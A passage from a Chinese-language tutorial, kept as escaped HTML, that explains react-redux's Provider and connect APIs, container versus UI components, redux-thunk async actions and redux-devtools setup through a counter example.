title=\"react-redux库\"></a>react-redux库</h2><p>一个 react 插件库，专门用来简化 react 应用中使用 redux。</p>\n<p>React-Redux 将所有组件分成两大类：</p>\n<ul>\n<li>UI 组件<br>a. 只负责 UI 的呈现，不带有任何业务逻辑<br>b. 通过 props 接收数据(一般数据和函数)<br>c. 不使用任何 Redux 的 API<br>d. 一般保存在 components 文件夹下</li>\n<li>容器组件<br>a. 负责管理数据和业务逻辑，不负责 UI 的呈现<br>b. 使用 Redux 的 API<br>c. 一般保存在 containers 文件夹下</li>\n</ul>\n<h3 id=\"相关api\"><a href=\"#相关api\" class=\"headerlink\" title=\"相关api\"></a>相关api</h3><p><strong>Provider</strong>：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 让所有组件都可以得到 state 数据</span></span><br><span class=\"line\">&lt;Provider store=&#123;store&#125;&gt;</span><br><span class=\"line\">\t&lt;App /&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/Provider&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>connect()</strong>：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 用于包装 UI 组件生成容器组件</span></span><br><span class=\"line\">connect(</span><br><span class=\"line\">\tmapStateToprops,</span><br><span class=\"line\">\tmapDispatchToProps</span><br><span class=\"line\">)(Counter)</span><br></pre></td></tr></table></figure>\n<p><strong>mapStateToprops()</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数: 将 state 数据转换为 UI 组件的标签属性</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mapStateToProps</span> (<span class=\"params\">state</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    \tcount: state</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>mapDispatchToProps</strong>：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数: 将分发 action 的函数转换为 UI 组件的标签属性</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mapDispatchToProps</span>(<span class=\"params\">dispatch</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    \tincrement: <span class=\"function\">(<span class=\"params\">number</span>) =&gt;</span> dispatch(increment(number)),</span><br><span class=\"line\">    \tdecrement: <span class=\"function\">(<span class=\"params\">number</span>) =&gt;</span> dispatch(decrement(number)),</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 对象: 简洁语法, 可以直接指定包含多个 action 方法</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> mapDispatchToProps = &#123;</span><br><span class=\"line\">    increment,</span><br><span class=\"line\">    decrement</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"react-redux版本-1\"><a href=\"#react-redux版本-1\" class=\"headerlink\" title=\"react-redux版本\"></a>react-redux版本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save react-redux</span><br><span class=\"line\"></span><br><span class=\"line\">redux/action-types.js 不变</span><br><span class=\"line\">redux/actions.js 不变</span><br><span class=\"line\">redux/reducers.js 不变</span><br><span class=\"line\">redux/store.js 不变</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// containers/App.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;connect&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> Counter <span class=\"keyword\">from</span> <span class=\"string\">'../components/Counter'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;increment, decrement&#125; <span class=\"keyword\">from</span> <span class=\"string\">'../redux/actions'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">// 指定向Counter传入哪些一般属性(属性值的来源就是store中的state)</span></span><br><span class=\"line\"><span class=\"comment\">const mapStateToProps = (state) =&gt; (&#123;count: state&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">// 指定向Counter传入哪些函数属性</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是函数, 会自动调用得到对象, 将对象中的方法作为函数属性传入UI组件</span></span><br><span class=\"line\"><span class=\"comment\">const mapDispatchToProps = (dispatch) =&gt; (&#123;</span></span><br><span class=\"line\"><span class=\"comment\">  increment: (number) =&gt; dispatch(increment(number)),</span></span><br><span class=\"line\"><span class=\"comment\">  decrement: (number) =&gt; dispatch(decrement(number)),</span></span><br><span class=\"line\"><span class=\"comment\">&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是对象, 将对象中的方法包装成一个新函数, 并传入UI组件</span></span><br><span class=\"line\"><span class=\"comment\">// const mapDispatchToProps = &#123;increment, decrement&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">export default connect(</span></span><br><span class=\"line\"><span class=\"comment\">  mapStateToProps,</span></span><br><span class=\"line\"><span class=\"comment\">  mapDispatchToProps</span></span><br><span class=\"line\"><span class=\"comment\">)(Counter)*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> connect(</span><br><span class=\"line\">  state =&gt; (&#123;<span class=\"attr\">count</span>: state&#125;),</span><br><span class=\"line\">  &#123;increment, decrement&#125;,</span><br><span class=\"line\">)(Counter)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// components/Counter.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123;Component&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PropTypes <span class=\"keyword\">from</span> <span class=\"string\">'prop-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">UI组件</span></span><br><span class=\"line\"><span class=\"comment\">  主要做显示与与用户交互</span></span><br><span class=\"line\"><span class=\"comment\">  代码中没有任何redux相关的代码</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">static</span> propTypes = &#123;</span><br><span class=\"line\">    count: PropTypes.number.isRequired,</span><br><span class=\"line\">    increment: PropTypes.func.isRequired,</span><br><span class=\"line\">    decrement: PropTypes.func.isRequired</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.decrement(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.props.count % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.props.count</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 入口js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">'react-dom'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Provider &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> App <span class=\"keyword\">from</span> <span class=\"string\">'./containers/App'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> store <span class=\"keyword\">from</span> <span class=\"string\">'./redux/store'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Provider</span> <span class=\"attr\">store</span>=<span class=\"string\">&#123;store&#125;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">  <span class=\"tag\">&lt;<span class=\"name\">App</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">Provider</span>&gt;</span></span>, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>))</span><br></pre></td></tr></table></figure>\n<h2 id=\"redux-thunk异步中间件\"><a href=\"#redux-thunk异步中间件\" class=\"headerlink\" title=\"redux-thunk异步中间件\"></a>redux-thunk异步中间件</h2><p><code>npm install --save redux-thunk</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/store.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore, applyMiddleware&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> thunk <span class=\"keyword\">from</span> <span class=\"string\">'redux-thunk'</span> <span class=\"comment\">// 引入依赖</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> createStore(reducer, applyMiddleware(thunk))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/actions.js</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  异步增加的异步 action</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> incrementAsync = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">number</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 返回一个带 dispatch 参数的函数</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">dispatch</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 执行异步操作</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 有了结果后, 通过同步的increment分发 action</span></span><br><span class=\"line\">      dispatch(increment(number))</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// components/Counter.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123;Component&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PropTypes <span class=\"keyword\">from</span> <span class=\"string\">'prop-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">UI组件</span></span><br><span class=\"line\"><span class=\"comment\">  主要做显示与与用户交互</span></span><br><span class=\"line\"><span class=\"comment\">  代码中没有任何redux相关的代码</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">static</span> propTypes = &#123;</span><br><span class=\"line\">    count: PropTypes.number.isRequired,</span><br><span class=\"line\">    increment: PropTypes.func.isRequired,</span><br><span class=\"line\">    decrement: PropTypes.func.isRequired,</span><br><span class=\"line\">    incrementAsync: PropTypes.func.isRequired <span class=\"comment\">// 引入异步方法</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.decrement(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.props.count % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\">// 使用 thunk 异步增加</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.incrementAsync(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.props.count</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// containers/App.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;connect&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> Counter <span class=\"keyword\">from</span> <span class=\"string\">'../components/Counter'</span></span><br><span class=\"line\"><span class=\"comment\">// 将 incrementAsync 挂载到 Counter</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;increment, decrement, incrementAsync&#125; <span class=\"keyword\">from</span> <span class=\"string\">'../redux/actions'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> connect(</span><br><span class=\"line\">  state =&gt; (&#123;<span class=\"attr\">count</span>: state&#125;),</span><br><span class=\"line\">  &#123;increment, decrement, incrementAsync&#125;,</span><br><span class=\"line\">)(Counter)</span><br></pre></td></tr></table></figure>\n<h2 id=\"redux-调试工具\"><a href=\"#redux-调试工具\" class=\"headerlink\" title=\"redux 调试工具\"></a>redux 调试工具</h2><p>在<code>chrome</code>安装<code>redux-devtool</code>插件</p>\n<p>项目中下载依赖：<code>npm install --save-dev redux-devtools-extension</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// // redux/store.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore, applyMiddleware&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"comment\">// 引入这个工具</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;composeWithDevTools&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux-devtools-extension'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> thunk <span class=\"keyword\">from</span> <span class=\"string\">'redux-thunk'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> createStore(reducer, 